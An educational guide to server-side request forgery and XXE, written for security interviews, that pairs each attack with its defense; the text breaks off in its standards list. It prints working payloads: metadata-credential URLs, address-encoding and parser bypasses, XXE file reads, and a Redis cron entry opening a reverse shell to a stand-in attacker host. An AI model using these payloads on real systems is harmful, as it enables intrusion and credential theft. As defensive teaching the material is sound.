# SSRF & Server-Side Request Attacks

**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker abuses a server's
ability to make outbound network requests, tricking it into fetching a URL (or opening a
connection) the attacker chose. Because the request originates from **inside** the trust
boundary — from the server, not the attacker's browser — it often reaches resources the
attacker could never touch directly: cloud metadata endpoints, internal admin panels,
databases, and other services shielded behind the perimeter. SSRF was promoted to its own
category, **A10:2021 – Server-Side Request Forgery**, in the OWASP Top 10 2021 (added by
community survey because of its severity and prevalence). It is also the root cause of some
of the most expensive breaches on record, most famously **Capital One (2019)**, where an
SSRF chained into the EC2 metadata service to steal IAM credentials.

This document is framework-agnostic. It teaches what SSRF is, why it is dangerous, the
attacker's toolkit of **bypasses** (IP encodings, DNS rebinding, redirects, parser
confusion), the correct **defenses** (allowlist + re-resolve, egress filtering, IMDSv2), the
common product features that introduce it (webhooks, PDF/image fetchers, URL previews), and
the closely related **XXE** vector. Each attack section follows a **vulnerable pattern →
concrete exploit → correct defense** shape.

> [!KEY-TAKEAWAY]
> SSRF turns your server into a confused deputy: it makes a request *on the attacker's
> behalf* using *your* network position and identity. The only robust fix is to constrain
> **where** the server is allowed to connect — an **allowlist of destinations**, validated
> against the IP the hostname *actually resolves to at connect time* — backed by **network
> egress controls**. Denylists of "bad" addresses are bypass-prone and fail alone.

---

## What SSRF is

**Definition.** SSRF occurs when a server takes a URL, hostname, or address that is
influenced by user input and makes a request to it *without adequately restricting the
destination*. The attacker controls the target of a request the server issues; the server
lends its network vantage point and credentials.

**Why it matters.** A server usually sits in a privileged network position: it can reach
internal-only services, a cloud metadata endpoint, and localhost admin interfaces that are
unreachable from the public internet. If the attacker can steer the server's requests, they
inherit that reach. Firewalls and WAFs generally do not help, because the malicious request
is a *legitimate outbound request from a trusted host*.

**Vulnerable pattern.** A "fetch a URL for me" feature:

```
POST /api/fetch-preview
Content-Type: application/json

{ "url": "https://example.com/logo.png" }
```

The server does something like `download(request.url)` with no restriction on the host. The
attacker simply changes the value:

```
{ "url": "http://169.254.169.254/latest/meta-data/" }
{ "url": "http://localhost:8080/admin/delete-all" }
{ "url": "http://10.0.0.5:6379/" }
```

**Where the input hides.** SSRF is not only about obvious "url" parameters. Common vectors:
importing a URL, webhooks, PDF/HTML-to-image renderers, XML/SVG parsers (see XXE), file
upload by URL, link "unfurling"/preview, PDF generators, SAML/OIDC metadata fetches, and any
field that later becomes a `Host`/redirect target. Any user-controlled value that ends up as
a network destination is a candidate.

> [!INTERVIEW]
> A crisp one-liner: "SSRF is when the *server* is coerced into making an
> attacker-controlled request, so the attacker borrows the server's network position and
> identity to reach things they otherwise couldn't." Then immediately mention cloud metadata
> as the highest-impact target.

---

## Impact and attack surface

SSRF impact ranges from information disclosure to full compromise. The classic targets:

- **Cloud metadata / credential theft.** On AWS the link-local endpoint
  `http://169.254.169.254/` (IMDS) exposes instance metadata and, critically, temporary IAM
  role credentials at `/latest/meta-data/iam/security-credentials/<role>`. GCP uses
  `metadata.google.internal` (`169.254.169.254`) and requires the header
  `Metadata-Flavor: Google`; Azure uses `169.254.169.254/metadata/instance` with
  `Metadata: true`. Stealing these credentials is the single highest-impact SSRF outcome —
  it is what happened in the Capital One breach.
- **Internal service access.** Reaching admin consoles, dashboards, key-value stores
  (Redis, memcached), databases, message brokers, Kubernetes API (`10.x`), Elasticsearch,
  and internal microservices that assume "if you can reach me, you're trusted."
- **Port scanning / network mapping.** By observing response timing, status codes, or error
  messages, an attacker maps which internal hosts/ports are open — using the server as a
  proxy scanner.
- **RCE pivot.** SSRF that can speak arbitrary bytes (via `gopher://`, or by smuggling
  through redirects) can drive protocols like Redis, memcached, or FastCGI to achieve remote
  code execution — e.g., writing a cron job through an unauthenticated Redis.
- **Bypassing access controls / reading local files.** `file://` can read local files;
  requests to `localhost` bypass IP allowlists that trust "internal" traffic.

> [!WARNING]
> SSRF against `169.254.169.254` on an instance still using **IMDSv1** yields IAM
> credentials with a single unauthenticated GET. This is why enforcing **IMDSv2** is the
> single most important cloud-side SSRF mitigation.

---

## In-band, blind, and semi-blind SSRF

Not all SSRF returns the fetched content to the attacker. The **oracle** available to the
attacker shapes exploitation.

| Type | What comes back | Exploitation |
|---|---|---|
| **In-band (basic)** | The full response body is reflected to the attacker | Read metadata, internal pages directly |
| **Semi-blind** | Not the body, but observable side effects: status code, response length, timing, error message | Infer open ports/hosts; boolean/timing oracle |
| **Blind** | Nothing reflected at all | Confirm via out-of-band interaction (DNS/HTTP callback) |

**Blind SSRF** is confirmed and exploited using an **out-of-band (OOB)** technique: point the
server at a domain you control (e.g., a Burp Collaborator / interactsh / your own DNS+HTTP
server) and watch for the callback:

```
{ "url": "http://a1b2c3.oob.attacker.example/" }
```

A DNS lookup or HTTP hit on your listener proves the server made the request. Even purely
blind SSRF is dangerous: it can still reach internal endpoints that perform state-changing
actions on GET, and timing differences turn it into a port scanner (fast connection-refused
vs. slow filtered/timeout).

> [!TIP]
> When triaging, first establish the oracle: does the response body come back? Does the
> status/length/time vary by target? If nothing, set up OOB. Your entire exploitation
> strategy depends on which of the three you have.

---

## Dangerous URL schemes and protocol smuggling

SSRF is not limited to HTTP. If the fetching library honors extra URL schemes, the blast
radius grows enormously. Attackers try:

- **`file://`** — read local files: `file:///etc/passwd`, `file:///proc/self/environ`.
- **`gopher://`** — the most dangerous: it lets an attacker send **arbitrary bytes** to a
  TCP port, so a single URL can craft a full Redis/SMTP/HTTP request. This is the usual path
  from SSRF to RCE (e.g., a gopher payload that issues Redis `SET`/`CONFIG`/`SAVE` to plant a
  webshell or cron job).
- **`dict://`** — talk to services that speak the DICT protocol; also usable to probe/poke
  arbitrary TCP services.
- **`ftp://`, `ldap://`, `tftp://`, `smtp://`** — reach those internal services.
- **`data:`** — inline payloads, sometimes used to smuggle content past filters.

**Vulnerable pattern.** A client (like libcurl) configured with all protocols enabled and
redirect following on.

**Correct defense.** **Disable every scheme you do not explicitly need** — usually only
`http` and `https`. In practice: set the HTTP client to reject non-HTTP schemes, restrict
libcurl with `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` to `HTTP|HTTPS`, and disable
automatic redirect following so a `301`/`302` to `gopher://` or `file://` can't slip past
your validation.

> [!INTERVIEW]
> If asked "how does SSRF become RCE?", the canonical answer is **`gopher://` to an
> unauthenticated internal Redis** — gopher lets you send raw bytes, so you script Redis to
> write a cron entry or SSH key. Follow up with the defense: scheme allowlist (http/https
> only) plus egress filtering.

---

## Cloud metadata: IMDSv1 versus IMDSv2

The cloud instance metadata service is the crown-jewel SSRF target because it hands out
short-lived IAM credentials. AWS's two versions differ sharply in SSRF resistance.

**IMDSv1 (request/response, legacy).** A plain unauthenticated GET returns data:

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
→ {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
```

Any SSRF that can issue a GET to that IP steals the role's credentials. This is exactly the
Capital One 2019 attack.

**IMDSv2 (session-oriented, hardened).** Requires a two-step, header-based handshake:

```
# 1. Get a session token via PUT (with a TTL header)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
→ <token>

# 2. Every GET must carry the token header
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
X-aws-ec2-metadata-token: <token>
```

Why this defeats most SSRF:

1. **It requires a `PUT`** with a custom header. Most SSRF-able fetchers only do `GET`s and
   cannot set arbitrary request headers, so they can't obtain a token.
2. **Response hop limit defaults to `1`** (an IP-level TTL on the PUT response). A request
   proxied through a container network or a reverse proxy adds a hop and the token response
   is dropped — blocking the common "SSRF via a reverse proxy / container" path.
3. **`PUT` requests carrying an `X-Forwarded-For` header are rejected**, defeating proxies
   that add that header.
4. Requests without a valid token get **`401 Unauthorized`**.

**Correct defense.** Set the instance metadata options to **`HttpTokens=required`** (IMDSv2
only, IMDSv1 disabled) and keep **`HttpPutResponseHopLimit=1`**; or disable IMDS entirely if
the workload doesn't need it. Note IMDSv2 is *defense in depth*, not a cure — it does not fix
the SSRF itself, only removes one high-value target.

> [!WARNING]
> IMDSv2 is not a silver bullet. If the SSRF primitive can set request headers and do a PUT
> (e.g., a full request-smuggling or gopher primitive), IMDSv2 can still be reached. Always
> fix the SSRF *and* enforce IMDSv2 *and* filter egress.

---

## Bypasses: IP encodings and address tricks

Naive defenses block strings like `169.254.169.254` or `127.0.0.1` or `localhost`. Attackers
defeat string/denylist checks with **alternate representations of the same address** — the
OS resolver and socket layer accept many forms that a simple regex won't recognize.

For `127.0.0.1` / `169.254.169.254`, equivalents include:

| Trick | Example for 127.0.0.1 |
|---|---|
| Decimal (dword) | `http://2130706433/` |
| Octal | `http://0177.0.0.1/` or `http://017700000001/` |
| Hex | `http://0x7f.0x0.0x0.0x1/` or `http://0x7f000001/` |
| Mixed | `http://0177.0.0.0x1/` |
| Shorthand | `http://127.1/`  (missing octets get filled) |
| Alternate loopback | `http://0.0.0.0/`, `http://[::1]/`, `http://[::]/` |
| IPv6-mapped IPv4 | `http://[::ffff:127.0.0.1]/`, `http://[::ffff:169.254.169.254]/` |
| Enclosed alphanumerics / Unicode | `http://①②⑦.0.0.1/` (some parsers normalize) |
| DNS name → private IP | `http://localtest.me/` resolves to `127.0.0.1`; `nip.io`/`sslip.io` map any IP into a hostname (e.g. `10.0.0.5.nip.io`) |

The `nip.io`/`xip.io`/`sslip.io` wildcard-DNS services are especially convenient: they let an
attacker put any target IP inside a legitimate-looking hostname that resolves to that IP.

**Correct defense.** Do **not** try to blocklist strings. Instead: parse the URL, resolve the
hostname to its actual IP(s), and **check the resolved IP against blocked ranges as integers/
`IPAddress` objects** — link-local (`169.254.0.0/16`, `fe80::/10`), loopback (`127.0.0.0/8`,
`::1`), RFC 1918 private (`10/8`, `172.16/12`, `192.168/16`), `0.0.0.0/8`, CGNAT
(`100.64.0.0/10`), and IPv6-mapped/embedded forms. Comparing normalized numeric addresses
neutralizes every textual encoding at once.

---

## DNS rebinding and TOCTOU

Even a correct "resolve then check the IP" defense has a subtle race: if you resolve the
hostname to validate it, then resolve it **again** when you actually connect, an attacker who
controls the DNS response can change the answer between the two lookups. This is a
**Time-Of-Check to Time-Of-Use (TOCTOU)** flaw specific to SSRF, called **DNS rebinding**.

**Concrete exploit.**

1. Attacker registers `evil.attacker.example` on a DNS server they control with a very low
   TTL (e.g. TTL 0/1s).
2. First lookup (validation) returns a **public** IP (e.g. `203.0.113.10`) — passes the
   allowlist/denylist check.
3. The server re-resolves when it opens the socket; now the DNS server answers with
   `169.254.169.254` (or `127.0.0.1`) — the connection goes to the internal target.

The related simpler bug: **DNS `A`+`AAAA` mismatch** — validate the `A` record (public) but
the client connects over IPv6 to a malicious `AAAA` (or vice versa).

**Correct defense.**

- **Resolve once, then connect to that exact resolved IP** ("DNS pinning") — validate the IP
  and then use *that IP* for the connection, not a second lookup of the name. Practically:
  resolve, check the IP is public/allowlisted, then connect to the literal IP (and set the
  `Host` header/SNI to the original name so TLS still works).
- Resolve and validate **all** returned addresses (both `A` and `AAAA`).
- Use an internal/pinning resolver for your own domains; alert if any allowlisted name
  resolves to an internal/link-local IP.

> [!INTERVIEW]
> A favorite senior question: "You resolve the hostname, confirm it's a public IP, then fetch
> it — is that safe?" The answer is **no, because of DNS rebinding**: the name can resolve to
> a different IP at connect time. You must **pin** the validated IP and connect to it
> directly.

---

## Bypasses: redirects and URL parser confusion

Two more classes of bypass defeat validators that only inspect the *initial* URL.

**Redirect-based bypass.** You validate `https://good.example/x` and it passes, but the
server follows redirects. `good.example` responds `302 Location: http://169.254.169.254/...`
or `http://127.0.0.1/`, and the client dutifully follows it to the internal target. Because
validation happened only on the first URL, the redirect target is never checked.

- *Defense:* **disable automatic redirect following**, or re-run the full IP validation on
  **every** redirect hop's resolved destination. Restrict redirect protocols to http/https.

**URL parser confusion.** Different components (your validator, the HTTP library, the DNS
resolver) parse the same URL string differently. Attackers exploit the disagreement —
Orange Tsai's classic "A New Era of SSRF" research showed many such splits. Examples:

```
http://expected-host@169.254.169.254/          # userinfo vs host confusion
http://169.254.169.254#@expected-host/          # fragment tricks
http://expected-host%2f@169.254.169.254/         # encoded slash
http://foo@evil.example:80@good.example/         # double @ / credentials
http://good.example\@169.254.169.254/            # backslash treated as / by some parsers
http://①②⑦。0。0。1/                            # unicode dot / fullwidth chars
```

A validator that grabs "everything after `@`" or splits on the first `/` may see a different
host than the HTTP client that ultimately connects.

- *Defense:* use a **single, well-tested URL parser** for both validation and the actual
  request (never two different ones), reject URLs with userinfo/`@`, reject non-standard
  characters, and — decisively — **resolve and pin the IP**, then connect to that IP so
  parser disagreements over the hostname can't route you anywhere unexpected.

---

## Defense: allowlist and re-resolve

The primary, positive defense. Two cases (per the OWASP SSRF Prevention Cheat Sheet):

**Case 1 — the set of legitimate destinations is known (internal apps).** Use a strict
**allowlist**:

- Validate input **format** first (is it a well-formed IP or domain?), then compare against
  an allowlist of trusted hosts/domains using exact, case-sensitive matching. Reject full
  URLs from the user where possible; accept only a validated identifier and build the URL
  server-side.
- Allowlist the **scheme** (http/https only), **port**, and **path prefix** too, not just the
  host.

**Case 2 — arbitrary external URLs are legitimate (e.g. public webhooks).** An allowlist is
impossible, so you must combine controls:

1. Parse the URL; enforce scheme ∈ {http, https} and an allowlisted port set.
2. **Resolve the hostname** (all `A`/`AAAA` records) and confirm every resolved IP is
   **public** — reject loopback, link-local, private/RFC 1918, CGNAT, multicast, reserved.
3. **Pin** the validated IP and connect to it directly (defeats rebinding), or re-validate on
   every redirect hop.
4. Disable redirects (or re-validate them) and disable non-HTTP schemes.
5. Optionally require a **signed/secret token** the receiver must echo, to prove the target
   really is a willing webhook endpoint.

> [!WARNING]
> **Denylists alone are bypass-prone** — the encoding table above shows why. Blocking
> `169.254.169.254` as a string misses `2852039166`, `[::ffff:169.254.169.254]`, and a
> rebinding DNS name. Denylists are a *last-resort supplement*; the numeric-range check on
> the *resolved* IP is what actually works. Prefer allowlists whenever the destinations are
> knowable.

**Minimum denylist ranges (when you must use one):** `127.0.0.0/8`, `0.0.0.0/8`, `::1/128`,
`169.254.0.0/16` + `fe80::/10` (link-local, incl. metadata `169.254.169.254`), `10.0.0.0/8`,
`172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, `224.0.0.0/4` + `ff00::/8` (multicast),
and cloud metadata hostnames (`metadata.google.internal`, etc.).

---

## Defense: network egress filtering and defense in depth

Application-layer validation can have bugs; a robust design constrains the **network** so
that even a perfect SSRF reaches nothing valuable. This is defense in depth.

- **Egress filtering / firewall.** Put the fetching service in a subnet/security group whose
  **outbound** rules only permit the destinations it legitimately needs. Deny egress to
  `169.254.169.254`, RFC 1918, and other internal ranges from any component that takes
  user-supplied URLs.
- **Dedicated fetch service / forward proxy.** Route all user-driven outbound fetches through
  a single hardened egress proxy that enforces the allowlist and IP checks centrally, isolated
  in its own network segment with no access to internal services or metadata.
- **Block metadata at the network layer.** Route/iptables rules dropping traffic to
  `169.254.169.254`, plus enforcing **IMDSv2** and a **hop limit of 1**.
- **Least-privilege IAM.** Even if credentials leak, the instance role should grant only what
  the workload needs, so a stolen token is far less useful.
- **Zero trust internally.** Internal services must authenticate callers rather than trusting
  "the request came from inside the network" — that assumption is exactly what SSRF violates.

> [!KEY-TAKEAWAY]
> Treat SSRF defense as two independent layers: (1) **application** — parse, allowlist,
> resolve, pin the IP, block schemes/redirects; and (2) **network** — egress filtering,
> isolated fetch proxy, blocked metadata, IMDSv2, least-privilege IAM. Either layer alone can
> fail; together they make SSRF low-impact.

---

## SSRF in webhooks, fetchers, and URL previews

SSRF is rarely a raw "fetch this URL" endpoint; it usually hides in a **product feature** that
inherently fetches user-supplied URLs. These are worth calling out because they're the ones
security reviews miss:

- **Webhooks.** "We'll POST to your callback URL" — the user supplies the URL, and the server
  connects to it. Classic Case-2 SSRF; must validate the resolved IP is public and disallow
  internal ranges/metadata on **every** delivery (rebinding-safe).
- **Link previews / URL unfurling.** Chat and social apps fetch a URL to render a title/thumbnail
  (Open Graph). Slack, Discord, and many others have had SSRF here.
- **PDF and HTML-to-image generators.** Server-side headless browsers/renderers (wkhtmltopdf,
  headless Chromium) will fetch `<img src>`, `<iframe>`, CSS `url()`, and follow `file://` or
  internal URLs embedded in attacker HTML — reading local files or metadata into the PDF.
- **Image / avatar "fetch from URL".** "Import your profile picture from a URL" fetches
  attacker-controlled hosts.
- **Document/SVG/XML importers.** SVG can reference external resources; XML can pull external
  entities (see XXE).
- **Integrations that fetch metadata.** SAML/OIDC discovery, RSS importers, "test connection"
  buttons, and analytics pixel fetchers.

The defense is identical across all of them: run the fetch through the validated,
IP-pinned, scheme-restricted, egress-filtered path described above. Treat *any* feature that
turns user input into an outbound connection as SSRF-sensitive.

---

## XXE as a related vector

**XML External Entity (XXE)** injection is a distinct vulnerability class (it maps to
**A05:2021 – Security Misconfiguration** in the 2021 Top 10, having been its own A4 category
in 2017) but it is a **common SSRF and file-read primitive**, so interviewers pair the two.

**Vulnerable pattern.** An XML parser that resolves **external entities** and has DTD
processing enabled parses attacker-supplied XML (a SOAP body, SVG, DOCX/XLSX, SAML, a config
upload).

**Concrete exploits.**

```xml
<!-- Local file read -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>

<!-- SSRF: force the parser to fetch an internal/metadata URL -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>&xxe;</data>
```

Blind XXE exfiltrates data out-of-band via a malicious external DTD ("parameter entity"
technique) when the entity value isn't reflected. XXE can also cause DoS (the "billion
laughs"/entity-expansion attack).

**Correct defense.** **Disable DTDs and external entity resolution** in the XML parser — the
single most effective control (e.g. set `disallow-doctype-decl` / `FEATURE_SECURE_PROCESSING`,
`external-general-entities=false`, `external-parameter-entities=false`, and disable XInclude/
entity expansion). Prefer less complex data formats (JSON) where possible, and patch/configure
parsers to be secure by default.

> [!INTERVIEW]
> Expect "how are XXE and SSRF related?" Answer: XXE lets an attacker make the XML parser
> fetch a `SYSTEM` URL (`http://169.254.169.254/...`), so XXE is one *delivery mechanism* for
> SSRF (and for local file reads). The fix is to **disable DTD/external-entity processing**.

---

## Real-world SSRF CVEs and incidents

Senior interviews expect you to name more than Capital One. A short roster of high-impact,
real-world SSRF (with the mechanism):

- **Capital One (2019).** SSRF in a misconfigured WAF (a ModSecurity/`SSRF`-prone reverse
  proxy) let an attacker reach **IMDSv1** and retrieve the instance role's IAM credentials,
  which had overly broad S3 permissions — ~100M records exposed. This case drove SSRF into
  its own OWASP Top 10 slot (A10:2021). **Would IMDSv2 have stopped it?** Very likely: the
  simple `GET` used could not perform the `PUT`+token handshake, and hop-limit 1 plus
  `X-Forwarded-For` rejection would have blocked the proxied path. It is the canonical
  defense-in-depth illustration (fix the SSRF **and** enforce IMDSv2 **and** scope IAM).
- **ProxyLogon — CVE-2021-26855 (Microsoft Exchange, 2021).** A **pre-auth SSRF** in Exchange:
  a crafted request to `/autodiscover` with a malicious `X-BEResource` cookie made the
  front-end (CAS) forward an attacker-controlled request to the back-end as the server itself,
  effectively **authenticating as the Exchange machine account**. Chained with
  **CVE-2021-27065** (post-auth arbitrary file write) it yielded RCE; ~30,000+ organizations
  were compromised. Shows SSRF used for *authentication bypass*, not just credential theft.
- **GitLab — CVE-2021-22214 (2021).** **Unauthenticated** SSRF via the CI/CD "import project
  by URL" / `ci/lint` API that fetched a remote `.gitlab-ci.yml`, letting an attacker make the
  GitLab server issue arbitrary internal requests (including to metadata). A textbook
  "fetch-a-URL feature" SSRF.
- **Ivanti Connect Secure (2024) and Grafana.** 2024 saw multiple **SSRF-to-RCE chains** in
  edge/VPN appliances (Ivanti) and SSRF/path-traversal issues in Grafana data-source proxies.
  The recurring pattern: an internet-facing device with a URL-fetch or proxy feature reaching
  its own localhost admin/API.

> [!INTERVIEW]
> If asked "name an SSRF beyond Capital One," lead with **ProxyLogon (CVE-2021-26855)** — a
> pre-auth SSRF that authenticated *as the server* and, chained with CVE-2021-27065, gave RCE
> across tens of thousands of Exchange servers. It reframes SSRF from "credential theft" to
> "impersonate the trusted server."

---

## GCP and Azure metadata specifics

AWS IMDSv2 is only one cloud's story. The header/handshake requirements differ, and the
*version-dependent* enforcement is a real SSRF footgun.

**GCP.** Metadata lives at `metadata.google.internal` / `169.254.169.254` (IPv6
`[fd20:ce::254]`). The modern, safe endpoint `computeMetadata/v1/` **requires the header
`Metadata-Flavor: Google`**, which most naive SSRF fetchers cannot set — a useful mitigation.
The footgun: the historical **`v0.1/` and `v1beta1/` endpoints did *not* require that header**
(they've since been disabled/deprecated). The older `X-Google-Metadata-Request: True` header
is deprecated in favor of `Metadata-Flavor: Google`. GCP also supports `?recursive=true`
(dump an entire subtree in one request) and `?alt=json`. Takeaway: header enforcement is
*version-specific*, so "GCP requires a header" is only true for `computeMetadata/v1/`.

**Azure IMDS.** Endpoint `169.254.169.254/metadata/instance`; identity/token at
`/metadata/identity/oauth2/token`. Its protections closely parallel IMDSv2:

- Requires the header **`Metadata: true`** — omit it and you get
  `400 Bad Request … Required metadata header not specified`.
- **Rejects any request carrying an `X-Forwarded-For` header** (returns an error) — the same
  proxy-defeating trick IMDSv2 uses.
- Requires an **`api-version=` query parameter**; a missing/invalid one is a `400`.
- Is non-routable and **must bypass any HTTP proxy** (`curl --noproxy "*"`), which also blocks
  the "SSRF through a forward proxy" path.

> [!INTERVIEW]
> Cloud-comparison drill: **AWS IMDSv2** = `PUT`+token header + hop-limit + XFF-reject; **Azure
> IMDS** = `Metadata: true` + XFF-reject + `api-version` + no-proxy; **GCP** = `Metadata-Flavor:
> Google` on `computeMetadata/v1/` (but *not* the legacy `v0.1`/`v1beta1` paths). All three lean
> on "require a header a simple fetcher can't set," but none replaces fixing the SSRF.

---

## Open-redirect chaining and hidden input vectors

**Open-redirect chaining is distinct from "the server follows redirects."** Here the attacker
supplies a URL whose **host is fully allowlisted and legitimate**, but that host contains an
**open-redirect** parameter:

```
https://trusted.example/redirect?url=http://169.254.169.254/latest/meta-data/
```

Host validation passes (the authority really is `trusted.example`), the IP check passes (it's a
public IP), and then the app follows the redirect *internally* to the metadata endpoint. This
defeats host-allowlisting even with a correct resolved-IP check — the fix is the same as any
redirect bypass (**don't auto-follow, or re-validate every hop's resolved IP**), plus fixing the
open redirect on the trusted host.

**SSRF hides in more than the `url` parameter.** Look past the obvious field:

- The **`Referer` header** — analytics and link-preview backends often fetch the Referer value
  (PortSwigger explicitly calls this out as hidden attack surface).
- **`Host` / `X-Forwarded-Host`** routing — used by reverse proxies and cache/"absolute URL"
  builders to construct outbound requests.
- **`Location`, RSS/OPML feed URLs, SAML/OIDC metadata URLs, PDF/HTML resource references,** and
  any "proxy target"/"callback"/"webhook"/"image import" field.

The rule: **any user-influenced value that becomes a network destination is an SSRF sink**, not
just parameters literally named `url`.

---

## Blind SSRF weaponization and client-side exploitation

Blind SSRF is more than a scanner. Two senior points:

**Reading OOB signals precisely.** In out-of-band testing, distinguish the callbacks:

- **DNS lookup *and* HTTP hit** on your listener → the server resolved *and* connected over
  HTTP: fully exploitable outbound.
- **DNS lookup but *no* HTTP hit** → DNS egress is open but **HTTP was blocked by network
  filtering**. This tells you the target is "vulnerable but egress-controlled." Next step: pivot
  to internal-service-specific OOB payloads, or exploit the server's own HTTP client (below),
  rather than assuming full outbound reach.
- **Neither** → the sink may not fire, or DNS egress itself is blocked.

**Semi-blind oracles, quantified.** Without a response body you still get:

- **Timing / connection state:** `connection refused` returns **fast** (port closed), a
  firewalled/filtered port **hangs then times out** (slow), and an open port returns a response
  (medium). This three-way timing split is a reliable port-scan oracle.
- **Response-length and status-code differentials**, and **error-message leakage** used as a
  boolean oracle ("`Connection refused`" vs. "`400 Bad Request`" vs. a timeout).

**Client-side exploitation of the server's own HTTP stack ("Cracking the Lens").** Force the
server to connect to *your* server, which returns a **malicious response** that exploits a bug
in the server's HTTP client/parser (oversized headers, header injection, decompression bombs,
deserialization of the response). This can yield compromise **with zero response reflection** —
elevating "blind SSRF" from an information oracle to a code-execution path.

---

## More dangerous schemes and CRLF protocol injection

Beyond `file`/`gopher`/`dict`, language-specific and cross-protocol tricks widen the blast
radius:

- **`phar://` (PHP).** Triggers PHP **object deserialization** when a Phar archive's metadata is
  read by a filesystem-style operation — an SSRF/file-path primitive that can reach RCE via a
  POP gadget chain.
- **`jar:` and `netdoc:` (Java).** `jar:` fetches and unpacks remote archives; `netdoc:` is a
  legacy file-read scheme in the JVM.
- **`ldap://` + JNDI (Java).** SSRF/URL-fetch feeding a JNDI lookup is the **Log4Shell**
  primitive: `ldap://attacker/Exploit` returns a serialized/remote-classloading payload → RCE.
  Bridges SSRF to the JNDI-injection class interviewers love.
- **`data:`** — inline payloads used to smuggle content past content-type or size filters.

**CRLF injection / request smuggling inside the SSRF URL.** Injecting `%0d%0a` (`\r\n`) into the
path or parameters of the outbound URL can **inject headers or a whole second request** into the
connection the server opens. This is a milder cousin of gopher: even when only `http`/`https` is
allowed and `gopher://` is disabled, CRLF smuggling can push text-protocol commands into a
tolerant internal service (Redis, memcached, SMTP) that ignores the HTTP preamble — so
"gopher is off" does **not** by itself prove Redis is unreachable. Defense: reject control
characters in URLs, use a hardened HTTP client that forbids CRLF in request targets, and pin the
IP + restrict egress.

---

## gopher-to-RCE concrete exploit steps

"Walk me through gopher → RCE" is a standard follow-up. Two canonical chains — the mechanics are
worth knowing, not just the name:

**1. Unauthenticated Redis.** `gopher://` sends raw bytes, so you script the Redis text protocol:

```
CONFIG SET dir /var/spool/cron/         # point Redis at the cron directory
CONFIG SET dbfilename root              # name the DB file 'root' (a crontab)
SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
SAVE                                    # flush the DB (writing the cron entry) to disk
```

The RDB dump written to `/var/spool/cron/root` is parsed by cron as a job → reverse shell.
Variants write an **SSH `authorized_keys`** to `~/.ssh/` or a webshell into a web root.

**2. PHP-FPM / FastCGI.** Speak the **FastCGI** protocol over gopher to a localhost FPM socket,
setting the `PHP_VALUE` param to `auto_prepend_file = php://input` (and `allow_url_include=On`),
then send PHP source in the request body — FPM executes it. This reaches RCE even when no web
server would route to the target script.

The defense is unchanged: **scheme allowlist (http/https only)**, no arbitrary-byte schemes,
**egress filtering** so internal Redis/FPM is unreachable, and authentication on internal
services (don't run unauthenticated Redis).

---

## DNS-rebinding defense implementation traps

"Pin the resolved IP" is the right principle, but naive implementations still rebind. The pin
must survive every place the stack might re-resolve or re-connect:

- **HTTP redirects.** Each hop is a new request; if the client re-resolves the redirect host,
  the pin is lost. **Re-pin (resolve + validate + connect-by-IP) on every hop**, or don't follow
  redirects.
- **Connection reuse / keep-alive / connection pooling.** A pooled connection keyed by hostname
  can be reused for a *later* request whose validation you skipped; ensure the pin is bound to
  the specific validated request, not just the first.
- **Happy Eyeballs (RFC 8305) dual-stack racing.** Clients race A (IPv4) and AAAA (IPv6)
  connections in parallel. If you validate only one family, the other can win the race to an
  internal address. **Validate all resolved addresses (A and AAAA)** before connecting.
- **Libraries that expose only `connect(hostname)`.** Any API where you validate a resolved IP
  but then hand the *name* to `connect()` re-resolves and is rebindable.

**Correct pin technique:** resolve the name → validate **every** returned address is public/
allowlisted → `connect()` to a **literal validated IP**, setting the `Host` header and TLS **SNI**
to the original name so certificate validation still works. A custom resolver/socket callback
(e.g. a DNS pinning resolver) that returns only the pinned IP is the robust implementation.

---

## Allowlist correctness pitfalls

Host allowlists fail in subtle, testable ways. Match the **parsed authority**, never a substring:

- **Trailing dot:** `good.example.` (fully-qualified form) is the same host but fails a naive
  `== "good.example"` and can bypass a suffix check — or vice versa.
- **Case:** DNS is case-insensitive; `GOOD.Example` must be normalized.
- **Suffix / prefix confusion:** a `endsWith("good.example")` check is bypassed by
  `good.example.attacker.com`; a `startsWith`/`contains` check by `attacker-good.example`. The
  attacker registers a domain that *contains* your allowlisted string.
- **Unicode / punycode homoglyphs:** `gооd.example` (Cyrillic `о`) or IDN homoglyphs render
  identically; normalize to punycode and compare.
- **Port not checked:** `good.example:6379` passes a host-only allowlist but targets a different
  service. Validate scheme, host, **and port**.
- **Userinfo:** `good.example@169.254.169.254` (see parser confusion) — reject `@`/userinfo.

Correct matching: parse the URL with one trusted parser, extract the **host and port**, normalize
(lowercase, strip trailing dot, punycode), and compare against the allowlist by **exact host +
allowed port**, then still resolve-and-pin the IP.

---

## IMDSv2 residual risk and the hop-limit tension

IMDSv2 is defense in depth, not a cure — enumerate what still defeats it:

- **Full request-forgery primitives.** SSRF that can set arbitrary **headers and method** (some
  gopher/CRLF-smuggling or library-level SSRF) can perform the `PUT`+token handshake and read
  credentials anyway.
- **Request smuggling** into the metadata connection can inject the required `PUT`/headers.
- **Misconfigured `HttpPutResponseHopLimit > 1`.** Containerized workloads legitimately need
  **hop limit 2** (the extra hop is the container network bridge), and operators often bump it to
  2+ for that reason — which simultaneously **re-opens the "SSRF through an extra hop / reverse
  proxy" path** the default of 1 was closing. This is the sharp senior tension: the value that
  makes containers work weakens the hop defense. Mitigate by keeping the metadata endpoint
  reachable **only** from the intended local process (host firewall/`iptables` on
  `169.254.169.254`) rather than relying on hop-limit alone.
- **Non-IMDS targets remain.** `file://`, internal admin panels, and Redis are untouched by any
  IMDS setting.

So: "IMDSv2 enforced, hop-limit 1" is **not** sufficient on its own — still fix the SSRF, block
egress to `169.254.169.254`, and scope IAM.

---

## Standards and control references

Ground SSRF/XXE claims in named controls (interviewers value precise citations):

- **OWASP Top 10 2021 — A10:2021 Server-Side Request Forgery.** SSRF's dedicated category.
- **OWASP ASVS v4:**
